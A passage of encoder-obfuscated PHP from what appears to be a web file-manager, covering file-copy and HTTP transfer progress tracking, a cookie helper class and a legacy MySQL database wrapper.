Hook::bind($’ş·†—Ã[599], array($this, $’ş·†—Ã[1709])); Hook::bind($’ş·†—Ã[600], array($this, $’ş·†—Ã[1710])); Hook::bind($’ş·†—Ã[565], array($this, $’ş·†—Ã[1711])); Hook::bind($’ş·†—Ã[562], array($this, $’ş·†—Ã[1711])); Hook::bind($’ş·†—Ã[567], array($this, $’ş·†—Ã[1711])); Hook::bind($’ş·†—Ã[569], array($this, $’ş·†—Ã[1711])); Hook::bind($’ş·†—Ã[571], array($this, $’ş·†—Ã[1711])); Hook::bind($’ş·†—Ã[1712], array($this, $’ş·†—Ã[1713])); Hook::bind($’ş·†—Ã[587], array($this, $’ş·†—Ã[1714])); $this->sourceModelCopyFlag = !1; Hook::bind($’ş·†—Ã[1715], array($this, $’ş·†—Ã[1716])); Hook::bind($’ş·†—Ã[1717], array($this, $’ş·†—Ã[1718])); Hook::bind($’ş·†—Ã[1719], array($this, $’ş·†—Ã[1720])); $æş°èšä[$’ş·†—Ã[1721]] = LNG($’ş·†—Ã[1722]); $æş°èšä[$’ş·†—Ã[1723]] = 0; $æş°èšä[$’ş·†—Ã[1724]] = 0; $æş°èšä[$’ş·†—Ã[1063]] = $’ş·†—Ã[12]; $æş°èšä[$’ş·†—Ã[1725]] = $’ş·†—Ã[12]; $æş°èšä[$’ş·†—Ã[1726]] = 0; $æş°èšä[$’ş·†—Ã[1727]] = 0; $æş°èšä[$’ş·†—Ã[1728]] = 0; if (!$æş°èšä[$’ş·†—Ã[1569]]) { $æş°èšä[$’ş·†—Ã[1569]] = LNG($’ş·†—Ã[1729]); } } protected function endAfter() { $†ŒÌ¾ÕÖ =& $_SERVER[ì™ı‰º¯]; Hook::unbind($†ŒÌ¾ÕÖ[1700], array($this, $†ŒÌ¾ÕÖ[1701])); Hook::unbind($†ŒÌ¾ÕÖ[1222], array($this, $†ŒÌ¾ÕÖ[1702])); Hook::unbind($†ŒÌ¾ÕÖ[1703], array($this, $†ŒÌ¾ÕÖ[1704])); Hook::unbind($†ŒÌ¾ÕÖ[596], array($this, $†ŒÌ¾ÕÖ[1705])); Hook::unbind($†ŒÌ¾ÕÖ[597], array($this, $†ŒÌ¾ÕÖ[1706])); Hook::unbind($†ŒÌ¾ÕÖ[602], array($this, $†ŒÌ¾ÕÖ[1707])); Hook::unbind($†ŒÌ¾ÕÖ[603], array($this, $†ŒÌ¾ÕÖ[1708])); Hook::unbind($†ŒÌ¾ÕÖ[599], array($this, $†ŒÌ¾ÕÖ[1709])); Hook::unbind($†ŒÌ¾ÕÖ[600], array($this, $†ŒÌ¾ÕÖ[1710])); Hook::unbind($†ŒÌ¾ÕÖ[565], array($this, $†ŒÌ¾ÕÖ[1711])); Hook::unbind($†ŒÌ¾ÕÖ[562], array($this, $†ŒÌ¾ÕÖ[1711])); Hook::unbind($†ŒÌ¾ÕÖ[567], array($this, $†ŒÌ¾ÕÖ[1711])); Hook::unbind($†ŒÌ¾ÕÖ[569], array($this, $†ŒÌ¾ÕÖ[1711])); Hook::unbind($†ŒÌ¾ÕÖ[571], array($this, $†ŒÌ¾ÕÖ[1711])); Hook::unbind($†ŒÌ¾ÕÖ[1712], array($this, $†ŒÌ¾ÕÖ[1713])); Hook::unbind($†ŒÌ¾ÕÖ[587], array($this, $†ŒÌ¾ÕÖ[1714])); Hook::unbind($†ŒÌ¾ÕÖ[1715], array($this, $†ŒÌ¾ÕÖ[1716])); Hook::unbind($†ŒÌ¾ÕÖ[1717], array($this, $†ŒÌ¾ÕÖ[1718])); Hook::unbind($†ŒÌ¾ÕÖ[1719], array($this, $†ŒÌ¾ÕÖ[1720])); } public function copyMoveStart($óÑ•˜§‰, $ğ¤Êá¡, $É×èÜÍ, $°ğ‘§¢‰) { $º¬ßîÁ =& $_SERVER[ì™ı‰º¯]; self::log($º¬ßîÁ[1730] . $ğ¤Êá¡ . $º¬ßîÁ[70] . $°ğ‘§¢‰); $«äŒç¢ = rtrim(TEMP_FILES, $º¬ßîÁ[8]); if (substr($ğ¤Êá¡, 0, strlen($«äŒç¢)) == $«äŒç¢) { return; } if (substr($°ğ‘§¢‰, 0, strlen($«äŒç¢)) == $«äŒç¢) { return; } $°òõÙñÃ =& $this->task; $°òõÙñÃ[$º¬ßîÁ[1731]] = KodIO::transferType($óÑ•˜§‰, $É×èÜÍ); $this->update(); } public function updateAfter() { $™Èç´Š =& $_SERVER[ì™ı‰º¯]; $†Ü¦ïÁ =& $this->task; if (!$†Ü¦ïÁ[$™Èç´Š[759]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($†Ü¦ïÁ[$™Èç´Š[1731]] == $™Èç´Š[1311]) { return; } self::updateTask($†Ü¦ïÁ); } private static function updateTask(&$ÈŒ¸Üì³) { $óŒà“Ñİ =& $_SERVER[ì™ı‰º¯]; if ($ÈŒ¸Üì³[$óŒà“Ñİ[1731]] == $óŒà“Ñİ[1193] || $ÈŒ¸Üì³[$óŒà“Ñİ[1731]] == $óŒà“Ñİ[107]) { if ($ÈŒ¸Üì³[$óŒà“Ñİ[1725]]) { $ÈŒ¸Üì³[$óŒà“Ñİ[1728]] = $ÈŒ¸Üì³[$óŒà“Ñİ[1727]] + $ÈŒ¸Üì³[$óŒà“Ñİ[1724]]; } } else { if ($ÈŒ¸Üì³[$óŒà“Ñİ[1731]] == $óŒà“Ñİ[1312]) { if ($ÈŒ¸Üì³[$óŒà“Ñİ[1725]] == $óŒà“Ñİ[1193]) { $ÈŒ¸Üì³[$óŒà“Ñİ[1728]] = $ÈŒ¸Üì³[$óŒà“Ñİ[1727]] + $ÈŒ¸Üì³[$óŒà“Ñİ[1724]] * 0.5; } else { if ($ÈŒ¸Üì³[$óŒà“Ñİ[1725]] == $óŒà“Ñİ[107]) { $ÈŒ¸Üì³[$óŒà“Ñİ[1728]] = $ÈŒ¸Üì³[$óŒà“Ñİ[1727]] + $ÈŒ¸Üì³[$óŒà“Ñİ[1723]] * 0.5 + $ÈŒ¸Üì³[$óŒà“Ñİ[1724]] * 0.5; } } } } $ÈŒ¸Üì³[$óŒà“Ñİ[1672]] = $ÈŒ¸Üì³[$óŒà“Ñİ[1728]] / $ÈŒ¸Üì³[$óŒà“Ñİ[759]]; if ($ÈŒ¸Üì³[$óŒà“Ñİ[1672]] > 0) { $Š£§à²ò = timeFloat() - $ÈŒ¸Üì³[$óŒà“Ñİ[1674]] - $ÈŒ¸Üì³[$óŒà“Ñİ[1677]]; $ÈŒ¸Üì³[$óŒà“Ñİ[1678]] = $Š£§à²ò * (1 - $ÈŒ¸Üì³[$óŒà“Ñİ[1672]]) / $ÈŒ¸Üì³[$óŒà“Ñİ[1672]]; } } public function addPath($áß†ú»à) { $ùñæã¹× =& $_SERVER[ì™ı‰º¯]; if (!$áß†ú»à) { return; } $µìŸãªÒ =& $this->task; $ºÌÛËõà = IO::infoWithChildren($áß†ú»à); $»¥ÇĞ’Ï = $µìŸãªÒ[$ùñæã¹×[1732]] ? $µìŸãªÒ[$ùñæã¹×[1732]][$ùñæã¹×[1733]] : 0; $µìŸãªÒ[$ùñæã¹×[1732]] = array($ùñæã¹×[1733] => $»¥ÇĞ’Ï + 1, $ùñæã¹×[420] => $ºÌÛËõà[$ùñæã¹×[32]], $ùñæã¹×[84] => $ºÌÛËõà[$ùñæã¹×[84]], $ùñæã¹×[509] => $ºÌÛËõà[$ùñæã¹×[509]] ? $ºÌÛËõà[$ùñæã¹×[509]] : $ºÌÛËõà[$ùñæã¹×[84]]); if ($ºÌÛËõà[$ùñæã¹×[33]] == $ùñæã¹×[200]) { $µìŸãªÒ[$ùñæã¹×[782]] += 1; } else { $µìŸãªÒ[$ùñæã¹×[782]] += $ºÌÛËõà[$ùñæã¹×[79]][$ùñæã¹×[77]]; if ($ºÌÛËõà[$ùñæã¹×[402]]) { $µìŸãªÒ[$ùñæã¹×[782]] += $ºÌÛËõà[$ùñæã¹×[79]][$ùñæã¹×[78]] + 1; } } $µìŸãªÒ[$ùñæã¹×[759]] += $ºÌÛËõà[$ùñæã¹×[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($¶ÁğİÓš) { } public function sourceAddHashEnd($¼¤öµ‡–) { } public function sourceAddFileStart($Ü¬ŠâÂ—) { $öãªÂ©ª =& $_SERVER[ì™ı‰º¯]; $ğÃÍÜ‹ß =& $this->task; $ğÃÍÜ‹ß[$öãªÂ©ª[1723]] = $Ü¬ŠâÂ—[$öãªÂ©ª[76]]; $ğÃÍÜ‹ß[$öãªÂ©ª[1721]] = $Ü¬ŠâÂ—[$öãªÂ©ª[32]]; $ğÃÍÜ‹ß[$öãªÂ©ª[1063]] = $Ü¬ŠâÂ—[$öãªÂ©ª[32]]; $ğÃÍÜ‹ß[$öãªÂ©ª[1734]] = $Ü¬ŠâÂ—[$öãªÂ©ª[84]]; $this->update(); } public function sourceAddFileEnd($Ê½èÎâ) { $Äúë´ÒÇ =& $_SERVER[ì™ı‰º¯]; $‰·Â°ÏÈ =& $this->task; $‰·Â°ÏÈ[$Äúë´ÒÇ[1728]] += $Ê½èÎâ[$Äúë´ÒÇ[76]]; $‰·Â°ÏÈ[$Äúë´ÒÇ[1734]] = $Ê½èÎâ[$Äúë´ÒÇ[84]]; $this->update(1); } public function copyFileStart($®ä¥¼, $éåıÎ¥¡, $×¿å„¦È, $İ×Ú¡ÍÁ, $ÛüÕÁ¢ò, $¡›ÒÈÑê) { $Ñ¸ô¥¢ü =& $_SERVER[ì™ı‰º¯]; $”È¶ÂÇâ = $ÛüÕÁ¢ò; if ($”È¶ÂÇâ == $GLOBALS[$Ñ¸ô¥¢ü[1735]]) { $”È¶ÂÇâ = $GLOBALS[$Ñ¸ô¥¢ü[1736]]; } $GLOBALS[$Ñ¸ô¥¢ü[1736]] = $ÛüÕÁ¢ò; $GLOBALS[$Ñ¸ô¥¢ü[1735]] = $¡›ÒÈÑê; $ãÑû¯Á¼ =& $this->task; $ãÑû¯Á¼[$Ñ¸ô¥¢ü[1721]] = $”È¶ÂÇâ; $ãÑû¯Á¼[$Ñ¸ô¥¢ü[1723]] = (int) $®ä¥¼->size($éåıÎ¥¡); $ãÑû¯Á¼[$Ñ¸ô¥¢ü[1724]] = 0; $ãÑû¯Á¼[$Ñ¸ô¥¢ü[1063]] = $Ñ¸ô¥¢ü[12]; $ãÑû¯Á¼[$Ñ¸ô¥¢ü[1725]] = $Ñ¸ô¥¢ü[12]; $ãÑû¯Á¼[$Ñ¸ô¥¢ü[1726]] = 0; $»Şèû× = $ãÑû¯Á¼[$Ñ¸ô¥¢ü[1723]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ãÑû¯Á¼[$Ñ¸ô¥¢ü[399]] . $Ñ¸ô¥¢ü[1737]); if ($»Şèû× && file_exists(get_path_father($İ×Ú¡ÍÁ))) { Cache::set($ãÑû¯Á¼[$Ñ¸ô¥¢ü[399]] . $Ñ¸ô¥¢ü[1737], $İ×Ú¡ÍÁ); $ãÑû¯Á¼[$Ñ¸ô¥¢ü[1694]] = array($Ñ¸ô¥¢ü[1738], $Ñ¸ô¥¢ü[1739]); } $this->update(0, $»Şèû×); } public static function updateCopyLocalFileSize($¯Ş¬Æå‘) { $¿Êô†¬î =& $_SERVER[ì™ı‰º¯]; $º©şğµ = Cache::get($¯Ş¬Æå‘[$¿Êô†¬î[399]] . $¿Êô†¬î[1737]); if (!$º©şğµ || !file_exists($º©şğµ)) { return $¯Ş¬Æå‘; } $¯Ş¬Æå‘[$¿Êô†¬î[1724]] = @filesize($º©şğµ); $¯Ş¬Æå‘[$¿Êô†¬î[1728]] += $¯Ş¬Æå‘[$¿Êô†¬î[1724]]; self::updateTask($¯Ş¬Æå‘); return $¯Ş¬Æå‘; } public function copyFileEnd($š¸÷¢Êş, $¶”¿¶ï, $ø¹ §Í, $Ä÷Œ¯ñŸ, $ÔÊ¬Ú”, $ëõ÷‘ÜÅ) { $ü÷ØŞ =& $_SERVER[ì™ı‰º¯]; $ş ¡àÚ =& $this->task; $ş ¡àÚ[$ü÷ØŞ[1724]] = $ş ¡àÚ[$ü÷ØŞ[1723]]; $ş ¡àÚ[$ü÷ØŞ[1725]] = $ü÷ØŞ[12]; unset($ş ¡àÚ[$ü÷ØŞ[1694]]); if ($ÔÊ¬Ú” == $ş ¡àÚ[$ü÷ØŞ[1721]]) { $ş ¡àÚ[$ü÷ØŞ[1727]] += $ş ¡àÚ[$ü÷ØŞ[1723]]; $ş ¡àÚ[$ü÷ØŞ[1728]] = $ş ¡àÚ[$ü÷ØŞ[1727]]; $Õ®¢ºËÀ = 1; if (isset($ş ¡àÚ[$ü÷ØŞ[1734]]) && $ş ¡àÚ[$ü÷ØŞ[1734]] == $¶”¿¶ï) { $Õ®¢ºËÀ = 0; } $this->update($Õ®¢ºËÀ); } else { $this->update(); $ş ¡àÚ[$ü÷ØŞ[1724]] = 0; } Cache::remove($ş ¡àÚ[$ü÷ØŞ[399]] . $ü÷ØŞ[1737]); self::log($ü÷ØŞ[1740] . $¶”¿¶ï . $ü÷ØŞ[70] . $Ä÷Œ¯ñŸ . $ü÷ØŞ[231] . $ÔÊ¬Ú” . $ü÷ØŞ[1741] . $ş ¡àÚ[$ü÷ØŞ[1721]]); } public function updateFileEnd($´ıµ½Õú, $‹û˜’âÕ) { $Š®äï†Û =& $_SERVER[ì™ı‰º¯]; $”åå¬Î› =& $this->task; $”åå¬Î›[$Š®äï†Û[1721]] = $´ıµ½Õú; $”åå¬Î›[$Š®äï†Û[1723]] = $‹û˜’âÕ; $”åå¬Î›[$Š®äï†Û[1727]] += $‹û˜’âÕ; $”åå¬Î›[$Š®äï†Û[1728]] = $”åå¬Î›[$Š®äï†Û[1727]]; $this->update(1); self::log($Š®äï†Û[1742] . $´ıµ½Õú); } public function sourceModelCopy($¡ñ´ø„Ü) { $À¨Ê‚ÁÌ =& $_SERVER[ì™ı‰º¯]; $ßÙÅşˆİ = $¡ñ´ø„Ü[0]; $ÛÇ’Ûó = $¡ñ´ø„Ü[1]; $©ºğÀ‘· =& $this->task; $this->sourceModelCopyFlag = !0; $ùñÓÀ­ = 0; switch ($ßÙÅşˆİ) { case $À¨Ê‚ÁÌ[563]: $ùñÓÀ­ = 1; break; case $À¨Ê‚ÁÌ[566]: $©ºğÀ‘·[$À¨Ê‚ÁÌ[1721]] = $ÛÇ’Ûó[$À¨Ê‚ÁÌ[32]]; break; case $À¨Ê‚ÁÌ[568]: $ùñÓÀ­ = intval($¡ñ´ø„Ü[$À¨Ê‚ÁÌ[380]] * 0.4); break; case $À¨Ê‚ÁÌ[570]: $ùñÓÀ­ = intval($¡ñ´ø„Ü[$À¨Ê‚ÁÌ[380]] * 0.2); break; case $À¨Ê‚ÁÌ[572]: $ùñÓÀ­ = intval($¡ñ´ø„Ü[$À¨Ê‚ÁÌ[380]] * 0.4); break; } $this->update($ùñÓÀ­); $this->sourceModelCopyFlag = !1; } public function sourceRemove($öµé´‚, $Ô§©óŒÖ) { $îÃˆ¤Í¡ =& $_SERVER[ì™ı‰º¯]; $this->sourceModelCopyFlag = !0; $å‘â’Ùê = 1; if (isset($öµé´‚[$îÃˆ¤Í¡[79]])) { $å‘â’Ùê = $öµé´‚[$îÃˆ¤Í¡[79]][$îÃˆ¤Í¡[77]]; $å‘â’Ùê = $å‘â’Ùê + $öµé´‚[$îÃˆ¤Í¡[79]][$îÃˆ¤Í¡[78]] + 1; } $this->update($å‘â’Ùê); $this->sourceModelCopyFlag = !1; } public function sourceMove($†Ê¦›Úƒ) { $this->sourceRemove($†Ê¦›Úƒ, !1); } public function curlProgress($Úˆ•·€ò, $•¹Û…Šø, $ŸÏÕ©ê, $Ìı±ƒ¤Ü, $·Ì…ñÊ§) { $ŒğÛãÕä =& $_SERVER[ì™ı‰º¯]; $Ëš«å’® =& $this->task; if ($·Ì…ñÊ§ > 0) { $Ëš«å’®[$ŒğÛãÕä[1063]] = $ŒğÛãÕä[1743]; $Ëš«å’®[$ŒğÛãÕä[1725]] = $ŒğÛãÕä[107]; if ($Ëš«å’®[$ŒğÛãÕä[1723]]) { $Ëš«å’®[$ŒğÛãÕä[1724]] = $·Ì…ñÊ§; } if ($Ëš«å’®[$ŒğÛãÕä[1726]]) { $Ëš«å’®[$ŒğÛãÕä[1724]] = $·Ì…ñÊ§ + $Ëš«å’®[$ŒğÛãÕä[1726]]; } } else { if ($ŸÏÕ©ê > 0) { if ($Ëš«å’®[$ŒğÛãÕä[1723]] == $•¹Û…Šø) { $Ëš«å’®[$ŒğÛãÕä[1724]] = $ŸÏÕ©ê; $Ëš«å’®[$ŒğÛãÕä[1063]] = $ŒğÛãÕä[1744]; $Ëš«å’®[$ŒğÛãÕä[1725]] = $ŒğÛãÕä[1193]; } } } $this->update(); } public function curlProgressStart($ŞáÛÊÆº) { } public function curlProgressEnd($áó§Ä£è) { $ôø¦´ìş =& $_SERVER[ì™ı‰º¯]; $£Ë ¡ØÛ =& $this->task; $¶«óºÉ = curl_getinfo($áó§Ä£è); $»ˆÂ×á = $¶«óºÉ[$ôø¦´ìş[1745]]; if ($»ˆÂ×á == -1) { $»ˆÂ×á = $¶«óºÉ[$ôø¦´ìş[1746]]; } if ($£Ë ¡ØÛ[$ôø¦´ìş[1725]] == $ôø¦´ìş[107] && $»ˆÂ×á) { $£Ë ¡ØÛ[$ôø¦´ìş[1726]] += $»ˆÂ×á; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $‹è’ œ =& $_SERVER[ì™ı‰º¯]; $ÇÙ¶æ =& $this->task; $ÇÙ¶æ[$‹è’ œ[1747]] = 1; Hook::bind($‹è’ œ[1715], array($this, $‹è’ œ[1748])); Hook::bind($‹è’ œ[1717], array($this, $‹è’ œ[1749])); Hook::bind($‹è’ œ[1719], array($this, $‹è’ œ[1750])); } protected function endAfter() { $†Ë«ëÎ¢ =& $_SERVER[ì™ı‰º¯]; Hook::unbind($†Ë«ëÎ¢[1715], array($this, $†Ë«ëÎ¢[1748])); Hook::unbind($†Ë«ëÎ¢[1717], array($this, $†Ë«ëÎ¢[1749])); Hook::unbind($†Ë«ëÎ¢[1719], array($this, $†Ë«ëÎ¢[1750])); } public function progressStart($Ñ€´ñÏÃ) { $¶–òı å =& $_SERVER[ì™ı‰º¯]; $ø›ÌşÉ = curl_getinfo($Ñ€´ñÏÃ); self::log($¶–òı å[1751] . $ø›ÌşÉ[$¶–òı å[307]]); self::valueSet($this->task[$¶–òı å[399]], $this->task); } public function progressEnd($Úàá×³) { $éëÀÔùı =& $_SERVER[ì™ı‰º¯]; self::log($éëÀÔùı[1752] . $this->task[$éëÀÔùı[399]]); $this->end(); } public function progress($¶•õÚ·î, $¤¶™‹¯, $—ªøÓùê, $ÛÈ®Íğè, $ğ÷Âğ¾›) { $˜äÛåÖ =& $_SERVER[ì™ı‰º¯]; $Â—áèÄÓ =& $this->task; if ($ğ÷Âğ¾› > 0) { $Â—áèÄÓ[$˜äÛåÖ[782]] = $Â—áèÄÓ[$˜äÛåÖ[782]] == 0 ? $ÛÈ®Íğè : $Â—áèÄÓ[$˜äÛåÖ[782]]; $Â—áèÄÓ[$˜äÛåÖ[1671]] = $ğ÷Âğ¾›; } else { if ($—ªøÓùê > 0) { $Â—áèÄÓ[$˜äÛåÖ[782]] = $Â—áèÄÓ[$˜äÛåÖ[782]] == 0 ? $¤¶™‹¯ : $Â—áèÄÓ[$˜äÛåÖ[782]]; $Â—áèÄÓ[$˜äÛåÖ[1671]] = $—ªøÓùê; } } $this->update(); self::log("\x70\x72\x6f\147\162\x65\x73\x73\110\x74\x74\x70\x3a\x64\157\167\x6e\x3a{$—ªøÓùê}\x2f{$¤¶™‹¯}\x3b\40\165\x70\154\x6f\141\144\72{$ğ÷Âğ¾›}\57{$ÛÈ®Íğè}\x3b"); } } goto eˆ¼–¹Ï—ª; Fœœ–¸°Êˆ: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ÃÖ«Í˜… = '', $Ü“ªÜ˜ó = 0) { if (is_string($ÃÖ«Í˜…) && $ÃÖ«Í˜… != $_SERVER[ì™ı‰º¯][12]) { $this->prefix = $ÃÖ«Í˜…; } if (is_numeric($Ü“ªÜ˜ó) && $Ü“ªÜ˜ó > 0) { $this->expire = $Ü“ªÜ˜ó; } } public static function getInstance() { static $ÒÏ¢şÑŸ; if ($ÒÏ¢şÑŸ === null) { $ÒÏ¢şÑŸ = new self(); } return $ÒÏ¢şÑŸ; } private static $cookieDisable = false; public static function disable($úÚ¥•û) { self::$cookieDisable = $úÚ¥•û; } private static $sameCookieSet = array(); public static function set($½ç€˜Äà, $ÉÁªÖ»³, $·Ù¹¼èë = 0, $ï„â†È³ = false, $·İÑÖ™ô = false) { $ °Ò³÷Ù =& $_SERVER[ì™ı‰º¯]; if (self::$cookieDisable) { return; } if (!$·Ù¹¼èë) { $·Ù¹¼èë = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$½ç€˜Äà]) && self::$sameCookieSet[$½ç€˜Äà] == $ÉÁªÖ»³ . $·Ù¹¼èë) { return; } self::$sameCookieSet[$½ç€˜Äà] = $ÉÁªÖ»³ . $·Ù¹¼èë; if (!$·İÑÖ™ô) { $·İÑÖ™ô = str_replace(HOST, $ °Ò³÷Ù[12], APP_HOST); $·İÑÖ™ô = _get($GLOBALS, $ °Ò³÷Ù[881], $·İÑÖ™ô); } $ùûªş‘ø = $ °Ò³÷Ù[12]; setcookie($½ç€˜Äà, $ÉÁªÖ»³, time() + $·Ù¹¼èë, $ °Ò³÷Ù[8] . trim($·İÑÖ™ô, $ °Ò³÷Ù[8]) . $ùûªş‘ø, !1, !1, $ï„â†È³); } public static function setSafe($†¸ÂÙ›, $©‡³ªÌ, $ÕŠÒºÖ = 0) { self::set($†¸ÂÙ›, $©‡³ªÌ, $ÕŠÒºÖ, !0); } public static function get($Ä¯±š¡Ï) { static $ÆÆû³óó = false; if (!$ÆÆû³óó) { self::initHeaderCookie(); $ÆÆû³óó = !0; } return isset($_COOKIE[$Ä¯±š¡Ï]) ? $_COOKIE[$Ä¯±š¡Ï] : !1; } private static function initHeaderCookie() { $Ö¸™”óî =& $_SERVER[ì™ı‰º¯]; if (!isset($_SERVER[$Ö¸™”óî[882]]) || !$_SERVER[$Ö¸™”óî[882]]) { return; } $È«·¹Ë = explode($Ö¸™”óî[71], $_SERVER[$Ö¸™”óî[882]]); foreach ($È«·¹Ë as $ÕÜ¨¼êŒ) { $ÕÜ¨¼êŒ = explode($Ö¸™”óî[883], $ÕÜ¨¼êŒ); if (count($ÕÜ¨¼êŒ) != 2 || !isset($ÕÜ¨¼êŒ[1])) { continue; } $_COOKIE[trim($ÕÜ¨¼êŒ[0])] = trim($ÕÜ¨¼êŒ[1]); } } public static function remove($ŸÊ€½«, $Á€ğÖµ  = false) { unset($_COOKIE[$ŸÊ€½«]); self::set($ŸÊ€½«, $_SERVER[ì™ı‰º¯][12], 1, $Á€ğÖµ ); } } class DbMysql extends Db { public function __construct($ĞÈÍáˆ = '') { $÷Ô÷¦¤ğ =& $_SERVER[ì™ı‰º¯]; if (!extension_loaded($÷Ô÷¦¤ğ[800])) { think_exception(think_lang($÷Ô÷¦¤ğ[14]) . $÷Ô÷¦¤ğ[884]); } if (!empty($ĞÈÍáˆ)) { $this->config = $ĞÈÍáˆ; if (empty($this->config[$÷Ô÷¦¤ğ[17]])) { $this->config[$÷Ô÷¦¤ğ[17]] = $÷Ô÷¦¤ğ[12]; } } } public function connect($ÖÜÍ×Œã = '', $ÑÜ˜ˆ­ô = 0, $ Ç¨÷Ü½ = false) { $öõİª¿¸ =& $_SERVER[ì™ı‰º¯]; if (!isset($this->linkID[$ÑÜ˜ˆ­ô])) { if (empty($ÖÜÍ×Œã)) { $ÖÜÍ×Œã = $this->config; } $›£‡óë = $ÖÜÍ×Œã[$öõİª¿¸[885]] . ($ÖÜÍ×Œã[$öõİª¿¸[886]] ? "\72{$ÖÜÍ×Œã[$öõİª¿¸[886]]}" : $öõİª¿¸[12]); $ğ”ê©²¯ = !empty($ÖÜÍ×Œã[$öõİª¿¸[17]][$öõİª¿¸[18]]) ? $ÖÜÍ×Œã[$öõİª¿¸[17]][$öõİª¿¸[18]] : $this->pconnect; if ($ğ”ê©²¯) { $this->linkID[$ÑÜ˜ˆ­ô] = mysql_pconnect($›£‡óë, $ÖÜÍ×Œã[$öõİª¿¸[887]], $ÖÜÍ×Œã[$öõİª¿¸[888]], 131072); } else { $this->linkID[$ÑÜ˜ˆ­ô] = mysql_connect($›£‡óë, $ÖÜÍ×Œã[$öõİª¿¸[887]], $ÖÜÍ×Œã[$öõİª¿¸[888]], !0, 131072); } if (!$this->linkID[$ÑÜ˜ˆ­ô] || !empty($ÖÜÍ×Œã[$öõİª¿¸[21]]) && !mysql_select_db($ÖÜÍ×Œã[$öõİª¿¸[21]], $this->linkID[$ÑÜ˜ˆ­ô])) { think_exception(mysql_error()); } $¿ä»µì¾ = mysql_get_server_info($this->linkID[$ÑÜ˜ˆ­ô]); mysql_query($öõİª¿¸[889] . think_config($öõİª¿¸[890]) . $öõİª¿¸[58], $this->linkID[$ÑÜ˜ˆ­ô]); if ($¿ä»µì¾ > $öõİª¿¸[891]) { mysql_query($öõİª¿¸[892], $this->linkID[$ÑÜ˜ˆ­ô]); } $this->connected = !0; if (1 != think_config($öõİª¿¸[22])) { unset($this->config); } } return $this->linkID[$ÑÜ˜ˆ­ô]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ä¿ŠşæÊ) { $€­¢Ÿ“ğ =& $_SERVER[ì™ı‰º¯]; if (0 === stripos($ä¿ŠşæÊ, $€­¢Ÿ“ğ[264])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ä¿ŠşæÊ; if ($this->queryID) { $this->free(); } think_action_status($€­¢Ÿ“ğ[23], 1); think_status($€­¢Ÿ“ğ[24]); $this->queryID = mysql_query($ä¿ŠşæÊ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($æŠÌÑÊÀ) { $²É‡Ÿ¤ =& $_SERVER[ì™ı‰º¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $æŠÌÑÊÀ; if ($this->queryID) { $this->free(); } think_action_status($²É‡Ÿ¤[25], 1); think_status($²É‡Ÿ¤[24]); $äºİ¾Æ” = mysql_query($æŠÌÑÊÀ, $this->_linkID); $this->debug(); if (!1 === $äºİ¾Æ”) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ì™ı‰º¯][893], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $§Í¹‡Ë = mysql_query($_SERVER[ì™ı‰º¯][894], $this->_linkID); $this->transTimes = 0; if (!$§Í¹‡Ë) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¼†úÎñ¢ = mysql_query($_SERVER[ì™ı‰º¯][895], $this->_linkID); $this->transTimes = 0; if (!$¼†úÎñ¢) { $this->error(); return !1; } } return !0; } private function getAll() { $ôøÙ¡´ = array(); if ($this->numRows > 0) { while ($ÉµÅ¦ñ– = mysql_fetch_assoc($this->queryID)) { $ôøÙ¡´[] = $ÉµÅ¦ñ–; } mysql_data_seek($this->queryID, 0); } return $ôøÙ¡´; } public function getFields($Òúâ­¶†) { $‡ÛÛÔãó =& $_SERVER[ì™ı‰º¯]; $¨¤ÅÃî’ = $this->query($‡ÛÛÔãó[896] . $this->parseKey($Òúâ­¶†)); $ºëòÔ·± = array(); if ($¨¤ÅÃî’) { foreach ($¨¤ÅÃî’ as $»õÑûş• => $µÓŸôŸ) { $ºëòÔ·±[$µÓŸôŸ[$‡ÛÛÔãó[31]]] = array($‡ÛÛÔãó[32] => $µÓŸôŸ[$‡ÛÛÔãó[31]], $‡ÛÛÔãó[33] => $µÓŸôŸ[$‡ÛÛÔãó[34]], $‡ÛÛÔãó[35] => (bool) (strtoupper($µÓŸôŸ[$‡ÛÛÔãó[36]]) === $‡ÛÛÔãó[897]), $‡ÛÛÔãó[37] => $µÓŸôŸ[$‡ÛÛÔãó[38]], $‡ÛÛÔãó[39] => strtolower($µÓŸôŸ[$‡ÛÛÔãó[40]]) == $‡ÛÛÔãó[41], $‡ÛÛÔãó[42] => strtolower($µÓŸôŸ[$‡ÛÛÔãó[43]]) == $‡ÛÛÔãó[44]); } } return $ºëòÔ·±; } public function getTables($Ã¹İ§“’ = '') { $ ğ¬òê¼ =& $_SERVER[ì™ı‰º¯]; if (!empty($Ã¹İ§“’)) { $’¹¶ÂÃø = $ ğ¬òê¼[898] . $Ã¹İ§“’ . $ ğ¬òê¼[899]; } else { $’¹¶ÂÃø = $ ğ¬òê¼[900]; } $…íµ¶Î  = $this->query($’¹¶ÂÃø); $ß—ıË¶ü = array(); foreach ($…íµ¶Î  as $ËçÈ›£ã => $ÄçƒÉŠ£) { $ß—ıË¶ü[$ËçÈ›£ã] = current($ÄçƒÉŠ£); } return $ß—ıË¶ü; } public function replace($™‰äŸĞŸ, $ÃüàÀ¡ = array()) { $¥Ôı»‡½ =& $_SERVER[ì™ı‰º¯]; foreach ($™‰äŸĞŸ as $çéöŒöÏ => $ˆÑ¬ƒëº) { $ÔÇ±éÀÁ = $this->parseValue($ˆÑ¬ƒëº); if (is_scalar($ÔÇ±éÀÁ)) { 